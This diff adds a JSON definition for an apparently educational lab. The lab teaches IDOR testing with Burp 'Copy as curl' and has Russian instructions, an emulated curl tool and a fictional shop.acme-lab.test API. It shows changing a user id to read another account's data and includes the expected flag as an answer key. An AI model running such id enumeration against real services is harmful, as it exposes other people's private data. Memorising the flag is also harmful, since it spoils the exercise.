@@ -1,0 +1,22 @@
+{
+  "id": "web-tool-burp-zap",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{1d0r_f0und_v14_r3p34t3r}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: IDOR через «Copy as curl» из Burp\n\nВ HTTP history Burp есть запрос `GET /api/users?id=1` (IDOR-кандидат).\nПроверим авторизацию, меняя `id`.\n\n1. Посмотри захваченный запрос (как его скопировал Burp — Copy as curl):\n\n   cat request.txt\n\n2. Воспроизведи свой запрос (id=1):\n\n   curl -s 'https://shop.acme-lab.test/api/users?id=1' -H 'Cookie: session=user'\n\n3. Проверь чужой объект — поменяй `id` на 2 (Repeater: меняем один параметр):\n\n   curl -s 'https://shop.acme-lab.test/api/users?id=2' -H 'Cookie: session=user' > found.txt\n\n4. Если вернулись данные другого пользователя с флагом — набери `check`.\n" },
+    { "path": "/home/student/task/request.txt", "text": "GET /api/users?id=1 HTTP/1.1\nHost: shop.acme-lab.test\nCookie: session=user\nUser-Agent: Mozilla/5.0\nAccept: application/json\n\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.acme-lab.test/api/users)",
+      "cases": [
+        { "match": "id=2", "example": "-s 'https://shop.acme-lab.test/api/users?id=2' -H 'Cookie: session=user'", "output": "{\"id\":2,\"user\":\"admin\",\"email\":\"admin@shop.acme-lab.test\",\"secret\":\"nto{1d0r_f0und_v14_r3p34t3r}\"}\n" },
+        { "match": "id=1", "example": "-s 'https://shop.acme-lab.test/api/users?id=1' -H 'Cookie: session=user'", "output": "{\"id\":1,\"user\":\"user\",\"email\":\"user@shop.acme-lab.test\"}\n" },
+        { "match": "api/users", "example": "-s 'https://shop.acme-lab.test/api/users' -H 'Cookie: session=user'", "output": "{\"error\":\"id required\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.acme-lab.test/api/users?id=...\n"
+    }
+  }
+}
